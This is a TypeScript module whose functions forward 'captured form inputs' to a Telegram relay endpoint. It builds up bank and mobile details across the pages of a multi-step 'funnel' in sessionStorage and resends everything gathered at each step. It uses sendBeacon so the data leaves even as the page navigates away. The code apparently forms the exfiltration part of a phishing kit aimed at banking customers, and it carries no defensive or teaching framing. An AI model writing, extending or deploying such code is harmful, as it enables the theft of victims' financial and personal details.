// Mirrors captured form inputs to Telegram. Designed to survive the
// client-side navigation that happens right after a form submit.
//
// navigator.sendBeacon is purpose-built for "send this as the page goes away"
// and is far more reliable than fetch+keepalive when a router.push fires in
// the same tick. We fall back to fetch(keepalive) when sendBeacon is missing.
export function notifyTelegram(
  title: string,
  fields: Array<{ label: string; value: string }>,
) {
  const clean = fields.filter((f) => f.value && f.value.trim().length > 0)
  if (clean.length === 0) return

  const payload = JSON.stringify({ title, fields: clean })
  const url = '/api/telegram/notify'

  try {
    if (typeof navigator !== 'undefined' && typeof navigator.sendBeacon === 'function') {
      const blob = new Blob([payload], { type: 'application/json' })
      const queued = navigator.sendBeacon(url, blob)
      if (queued) return
    }
  } catch {
    // fall through to fetch
  }

  void fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: payload,
    keepalive: true,
  }).catch(() => undefined)
}

// Key used to carry the accumulated funnel fields across client-side page
// navigations for the duration of the browser session.
const FUNNEL_KEY = 'sbp_funnel_fields'

type Field = { label: string; value: string }

function readAccumulated(): Field[] {
  try {
    if (typeof sessionStorage === 'undefined') return []
    const raw = sessionStorage.getItem(FUNNEL_KEY)
    if (!raw) return []
    const parsed = JSON.parse(raw)
    return Array.isArray(parsed) ? parsed : []
  } catch {
    return []
  }
}

function writeAccumulated(fields: Field[]) {
  try {
    if (typeof sessionStorage === 'undefined') return
    sessionStorage.setItem(FUNNEL_KEY, JSON.stringify(fields))
  } catch {
    // ignore
  }
}

// Appends this step's fields to the running set and sends EVERYTHING collected
// so far to Telegram. Each successive page therefore reports its own details
// plus all details from previous pages. Fields sharing a label (e.g. "Bank",
// "Mobile") update in place instead of duplicating. Pass { reset: true } on the
// first step of the funnel to start a fresh accumulation.
export function notifyTelegramCumulative(
  title: string,
  fields: Field[],
  options?: { reset?: boolean },
) {
  const clean = fields.filter((f) => f.value && f.value.trim().length > 0)
  const accumulated = options?.reset ? [] : readAccumulated()

  for (const f of clean) {
    const existing = accumulated.find((a) => a.label === f.label)
    if (existing) {
      existing.value = f.value
    } else {
      accumulated.push(f)
    }
  }

  writeAccumulated(accumulated)
  if (accumulated.length === 0) return
  notifyTelegram(title, accumulated)
}
